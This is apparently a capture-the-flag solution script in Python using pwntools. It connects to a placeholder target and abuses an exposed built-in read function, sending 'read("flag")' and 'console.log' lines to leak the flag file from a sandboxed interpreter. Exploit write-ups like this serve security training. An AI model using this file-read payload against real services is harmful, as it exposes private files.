'''
unexpected solution: built-in read function is available, read the flag and log out
'''

from pwn import *


url, port = "target_ip", "25307" 
context(arch="amd64", os="linux")
io = remote(url, port)

def pwn():
    payload = b'tmp = read("flag")'
    io.sendline(payload)
    payload = b'console.log(tmp)'
    io.sendline(payload)
    

if __name__ == "__main__":
    pwn()
    io.interactive()
